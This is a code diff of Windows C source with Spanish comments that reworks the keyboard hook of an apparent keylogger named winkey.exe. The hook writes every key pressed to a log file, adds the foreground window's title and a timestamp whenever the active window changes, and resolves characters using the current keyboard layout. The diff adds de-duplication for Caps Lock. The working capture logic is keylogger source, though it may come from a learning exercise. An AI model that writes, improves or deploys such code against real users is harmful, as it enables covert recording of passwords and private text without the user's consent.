@@ -41,64 +41,82 @@ LRESULT CALLBACK LowLevelKeyboardProc(
     // Variable estatica para recordar la ultima ventana activa (Handle to windows)
     static HWND lastHwnd = NULL;
 
-    // Procesar y escribir la tecla
-    KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
-    DWORD vkCode = p->vkCode;  // Código virtual de la tecla
+    if (nCode == HC_ACTION) {
+        // Procesar y escribir la tecla
+        KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
+        DWORD vkCode = p->vkCode;  // Código virtual de la tecla
 
-    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
-
-        // filtro para teclas dobles
-        if (p->flags & LLKHF_INJECTED) {
-            return CallNextHookEx(g_hHook, nCode, wParam, lParam);
-        }
-
-        // 1. Obtener la ventana actual
-        HWND currentHnwd = GetForegroundWindow();
-
-        // 2. Comprobar si la ventana ha cambiado
-        if (currentHnwd != lastHwnd) {
-            // Actualizamos la ventana
-            lastHwnd = currentHnwd;
-
-            // Obtenemos el titulo de la ventana
-            WCHAR windowTitle[256];
-            GetWindowTextW(currentHnwd, windowTitle, 256);
-
-            // obtener el timestamp
-            time_t t = time(NULL);
-            struct tm tm_info;
-            localtime_s(&tm_info, &t);
-            char timeString[30];
-            strftime(timeString, sizeof(timeString), "%d.%m.%Y %H:%M:%S", &tm_info);
-
-            // Escribir la cabezera en el log
-            if (logFile) {
-                // Convertir el titulo de WCHAR a char par fprintf
-                char title_mb[256];
-                WideCharToMultiByte(CP_UTF8, 0, windowTitle, -1, title_mb, sizeof(title_mb), NULL, NULL);
-                fprintf(logFile, "\n\n[%s] - '%s'\n", timeString, title_mb);
-                fflush(logFile);
+        // --- Solución robusta para CAPS LOCK ---
+        static BOOL capsLockWasDown = FALSE;
+        if (vkCode == VK_CAPITAL) {
+            if (wParam == WM_KEYDOWN) {
+                if (!capsLockWasDown) {
+                    capsLockWasDown = TRUE;
+                    // Solo procesar el flanco de subida (primera vez que se pulsa)
+                } else {
+                    // Ya estaba pulsado, ignorar duplicados
+                    return CallNextHookEx(g_hHook, nCode, wParam, lParam);
+                }
+            } else if (wParam == WM_KEYUP) {
+                capsLockWasDown = FALSE;
+                // No procesar nada en el flanco de bajada
+                return CallNextHookEx(g_hHook, nCode, wParam, lParam);
+            } else {
+                // Otros eventos, ignorar
+                return CallNextHookEx(g_hHook, nCode, wParam, lParam);
             }
         }
 
-        // --- Obtener el Idioma que se esta usando ---
-        // Obtener el HILO de la ventana activa para saber su distribución de teclado
-        DWORD threadId = GetWindowThreadProcessId(currentHnwd, NULL);
-        // Obtener la distribución de teclado (Qwerty, azerty, etc) de ese hilo
-        HKL keyboardLayout = GetKeyboardLayout(threadId);
-        // --- Fin de obtener el idioma ---
+        // Solo procesar eventos de tecla presionada
+        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
+            // 1. Obtener la ventana actual
+            HWND currentHwnd = GetForegroundWindow();
+            
+            // Comprobar si la ventana ha cambiado
+            if (currentHwnd != lastHwnd) {
+                // Actualizamos la ventana
+                lastHwnd = currentHwnd;
 
-        // Funcion para obtener el caracter o nombre de la tecla
-        char* keyChar = VirtualKeyToChar(vkCode, p->scanCode, keyboardLayout);
+                // Obtenemos el titulo de la ventana
+                WCHAR windowTitle[256];
+                GetWindowTextW(currentHwnd, windowTitle, 256);
 
-        // Ver en terminal las teclas pulsadas ejecutando winkey.exe 
-        //printf("Tecla: %lu, \tchar: %s\n", vkCode, keyChar);
-        //printf("vkCode: %lu, scanCode: %lu, char: %s\n", vkCode, p->scanCode, keyChar);
+                // obtener el timestamp
+                time_t t = time(NULL);
+                struct tm tm_info;
+                localtime_s(&tm_info, &t);
+                char timeString[30];
+                strftime(timeString, sizeof(timeString), "%d.%m.%Y %H:%M:%S", &tm_info);
 
-        // crear archivo si no existe
-        if (logFile) {
-            fprintf(logFile, "%s", keyChar);
-            fflush(logFile); //Forzar escritura inmediata
+                // Escribir la cabezera en el log
+                if (logFile) {
+                    // Convertir el titulo de WCHAR a char par fprintf
+                    char title_mb[256];
+                    WideCharToMultiByte(CP_UTF8, 0, windowTitle, -1, title_mb, sizeof(title_mb), NULL, NULL);
+                    fprintf(logFile, "\n\n[%s] - '%s'\n", timeString, title_mb);
+                    fflush(logFile);
+                }
+            }
+
+            // --- Obtener el Idioma que se esta usando ---
+            // Obtener el HILO de la ventana activa para saber su distribución de teclado
+            DWORD threadId = GetWindowThreadProcessId(currentHwnd, NULL);
+            // Obtener la distribución de teclado (Qwerty, azerty, etc) de ese hilo
+            HKL keyboardLayout = GetKeyboardLayout(threadId);
+            // --- Fin de obtener el idioma ---
+
+            // Funcion para obtener el caracter o nombre de la tecla
+            char* keyChar = VirtualKeyToChar(vkCode, p->scanCode, keyboardLayout);
+
+            // Ver en terminal las teclas pulsadas ejecutando winkey.exe 
+            //printf("Tecla: %lu, \tchar: %s\n", vkCode, keyChar);
+            //printf("vkCode: %lu, scanCode: %lu, char: %s\n", vkCode, p->scanCode, keyChar);
+
+            // crear archivo si no existe
+            if (logFile) {
+                fprintf(logFile, "%s", keyChar);
+                fflush(logFile); //Forzar escritura inmediata
+            }
         }
     }
     return CallNextHookEx(g_hHook, nCode, wParam, lParam);
